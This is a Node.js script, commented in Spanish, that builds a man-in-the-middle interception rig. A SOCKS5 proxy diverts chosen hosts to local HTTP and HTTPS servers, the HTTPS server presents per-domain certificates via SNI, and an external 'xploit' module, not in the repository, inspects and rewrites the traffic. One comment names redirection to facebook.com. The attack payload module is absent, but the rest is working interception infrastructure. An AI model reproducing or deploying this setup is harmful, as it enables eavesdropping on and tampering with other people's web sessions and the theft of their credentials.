// no se puede usar npm install como normalmente se haria
// porque hay que modificar la libreria con nuestra propia version
var argyle = require('./lib/argyle/index.js');
var http = require("http");
var https = require("https");
var fs = require("fs");
var crypto = require("crypto");

// este archivo NO esta en el repo
var xploit = require('./xploit.js');

var httpProxy = require('http-proxy');
var localPort = 8080;
var httpsLocalPort = 8443;

var lastSocksHost;
var lastSocksPort;

// redirige todos los requests a facebook.com
var proxy = httpProxy.createProxyServer({});
var httpServer = http.createServer(function(req, res) {
  var target;
  if (req.headers.host) {
    target = 'http://' + req.headers.host;
  } else {
    target = lastSocksHost + ":" + lastSocksPort;
  }

  var streams = xploit.interceptStreams(req, res);
  proxy.web(streams.req, streams.res, { target: target });
});
httpServer.listen(localPort, '0.0.0.0');

function getCredentialsContext (hostname) {
  return crypto.createCredentials({
    key: fs.readFileSync('keys/'+hostname+'/ssl-server.key'),
    cert: fs.readFileSync('keys/'+hostname+'/ssl-server.crt')
  }).context;
}

var options = {
  key: fs.readFileSync('keys/ssl-server.key'),
  cert: fs.readFileSync('keys/ssl-server.crt'),
  SNICallback: function(hostname){
    try {
      console.log("Usando certificado para " + hostname);
      return getCredentialsContext(hostname);
    } catch(e) {
      console.log(e);
      return null
    }
  }
};
var httpsServer = https.createServer(options, function (req, res) {
  var target;
  if (req.headers.host) {
    target = 'https://' + req.headers.host;
  } else {
    target = lastSocksHost + ":" + lastSocksPort;
  }

  var streams = xploit.interceptStreams(req, res);
  proxy.web(streams.req, streams.res, { target: target });
});
httpsServer.listen(httpsLocalPort, '0.0.0.0');

// este es un proxy socks5 normal
var socksServer = argyle(8888, '0.0.0.0');

socksServer.hostPortFilter = function(host, port) {
  var intercept = xploit.shouldIntercept(host, port);
  if (intercept) {
    lastSocksHost = host;
    lastSocksPort = port;

    if (intercept === "http") {
      return {host: '127.0.0.1', port: localPort};
    } else {
      return {host: '127.0.0.1', port: httpsLocalPort};
    }
  }
};


socksServer.on('connected', function(req, dest) {
    // aca no se puede interceptar nada, esto es trafico encriptado
    req.pipe(dest);
    dest.pipe(req);
});

